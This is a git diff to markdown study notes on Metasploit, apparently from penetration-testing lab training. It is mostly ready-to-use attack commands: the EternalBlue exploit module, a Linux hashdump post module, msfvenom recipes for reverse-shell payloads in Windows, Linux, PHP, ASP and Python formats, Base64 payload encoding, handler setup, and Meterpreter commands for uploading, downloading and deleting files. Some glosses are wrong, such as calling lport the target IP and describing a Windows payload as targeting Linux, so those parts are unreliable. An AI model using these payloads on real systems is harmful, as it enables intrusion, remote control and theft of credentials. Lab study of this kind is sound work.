@@ -111,6 +111,8 @@ You may want to look for low-hanging fruits such as:
 - SSH: Could have default or easy to guess credentials
 - RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.
 
+You can also list other available payloads using the `show payloads` command with any module.
+
 use option number 10
 ```
 use 10
@@ -131,10 +133,15 @@ run
 ```
 run
 ```
-proceed to exploit stage
+
+then move onto an 'sploit' directory within the msfconsole
+```shell-session
+msf6 > use exploit/windows/smb/ms17_010_eternalblue 
 ```
-exploit
-```
+
+You can also list other available payloads using the `show payloads` command with any module.
+
+## scanning using msfconsole
 
 >Metasploit has a number of modules to scan open ports
 
@@ -153,5 +160,82 @@ You can directly perform Nmap scans from the msfconsole
 ```shell-session
 msf6 > nmap -sS 10.10.12.229
 ```
+
+---
+
+# Handy msfconsole modules 
+
+Post Module to dump the password hashes for all users on a Linux System
+`linux/gather/hashdump
+Eternal Blue exploit
+`search eternalblue`
+
+
+
+---
+# msfvenom create payloads
+
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
+
+- -p    creates payload
+- windows/x64/shell/reverse_tcp     reverse shell for a x86 Linux Target
+- -f    prints to .exe format
+- lhost     listen IP
+- lport     target IP
+
+>***Encoders*** do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload.
+
+The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.
+```shell-session
+sfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
+```
+
+---
+# Meterpreter Shells
+
+searches available meterpreter shells
+`msfvenom --list payloads | grep meterpreter`
+
+Linux Executable and Linkable Format (elf)
+`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
+
+Windows  
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
+  
+PHP  
+`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
+  
+ASP  
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
+  
+Python  
+`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
+
+All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler.
+```
+msf6 > use exploit/multi/handler 
+set payload php/reverse_php
+```
+
+linux handler Meterpreter Handler
+`set payload linux/x86/meterpreter/reverse_tcp`
+
+## File system commands within the meterpreter session
+
+- `cd`: Will change directory
+- `ls`: Will list files in the current directory (dir will also work)
+- `pwd`: Prints the current working directory
+- `edit`: will allow you to edit a file
+- `cat`: Will show the contents of a file to the screen
+- `rm`: Will delete the specified file
+- `search`: Will search for files
+- `upload`: Will upload a file or directory
+- `download`: Will download a file or directory
+
+Meterpreter [CheatSheet](https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking%20-%20Meterpreter%20Cheat%20%20Sheet.pdf)
+
+
 
 
